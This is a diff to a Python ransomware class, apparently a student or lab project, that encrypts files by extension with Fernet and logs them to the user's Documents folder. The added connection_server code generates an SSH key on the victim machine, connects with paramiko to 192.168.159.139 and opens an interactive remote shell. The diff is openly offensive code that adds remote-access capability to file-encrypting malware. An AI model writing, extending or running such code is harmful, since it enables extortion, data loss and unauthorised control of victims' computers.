@@ -12,6 +12,7 @@ import subprocess
 import psutil
 from threading import Thread
 from time import sleep
+import paramiko
 
 
 class RansomWare:
@@ -27,38 +28,54 @@ class RansomWare:
         self.crypted_files = []
   
     def create_ssh_key(self, ssh_path):
-            os.makedirs(ssh_path)
-            gen_key_comm = [
-            "powershell", 
-            "ssh-keygen", 
-            "-q", "-t", "rsa", 
-            "-b", "4096", 
-            "-f", f"{ssh_path}/id_rsa",
-            "-N", ""
-        ]
-            subprocess.run(gen_key_comm, capture_output=True)
+        try:
+            os.makedirs(ssh_path, exist_ok=True)
+            gen_key_comm = f'powershell ssh-keygen -q -t rsa -b 4096 -f {ssh_path}/id_rsa -N ransomware'
+            result = subprocess.run(gen_key_comm, capture_output=True, shell=True)
+            if result.returncode == 0:
+                return True
+            else:
+                print(f"Error creating SSH key: {result.stderr.decode()}")
+                return False
+        except Exception as e:
+            print(f"Exception occurred while creating SSH key: {e}")
+            return False
 
-        
-        
     def connection_server(self):
-        is_connected = False
         ssh_path = os.path.join(os.environ['USERPROFILE'], '.ssh')
-        if not (os.path.exists(ssh_path)):
-            is_connected = self.create_ssh_key(ssh_path)
+        if not os.path.exists(f'{ssh_path}/id_rsa'):
+            is_created = self.create_ssh_key(ssh_path)
+            print(is_created)
+        else:
+            is_created = True
         
-        if not is_connected:
-            connectionCommand = "ssh kali@192.168.159.139"
-            while not is_connected:
-                try:
-                    print("tentativo di connessione...")
-                    subprocess.run(connectionCommand)
-                    is_connected = True
-                    print("connessione al server riuscita")
-                except Exception as e:
-                    print(e)
-                    sleep(5)
-    
-   
+        if is_created:
+            is_connected = False
+            client = paramiko.SSHClient()
+
+            try:
+                key = paramiko.RSAKey.from_private_key_file(f'{ssh_path}\\id_rsa')
+                
+                #client.load_system_host_keys()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+                
+                client.connect(hostname="192.168.159.139", port=22, username="nalid", key_filename=key)
+                channel = client.invoke_shell()
+
+                while(True):
+                    command = input("> ")
+                    channel.send(command + "\n")
+                    if command == exit:
+                        break
+                    while not channel.recv_ready():
+                        pass
+                    output = channel.recv(1024).decode('utf-8')
+                    print(output)
+            except Exception as e:
+                print(e)
+            finally:
+                client.close()
+
 
     def generate_key(self):
         self.key = Fernet.generate_key()
@@ -104,8 +121,8 @@ class RansomWare:
             return new_path
         
     def write_log(self):
-        with open("log_file.txt", 'w') as f:
-            for file_path in self.crypt_file:
+        with open(f"{self.sysRoot}\\Documents\\log_file.txt", 'w') as f:
+            for file_path in self.crypted_files:
                 f.write(f"{file_path}\n")
                 
     def crypt_system(self, encrypted=False):
@@ -116,6 +133,7 @@ class RansomWare:
                 if file.split('.')[-1] not in self.file_exts:
                     continue
                 self.crypt_file(file_path, encrypted=encrypted)
+        self.write_log()
 
     def already_exists(self, key_path, key_name):
         try:
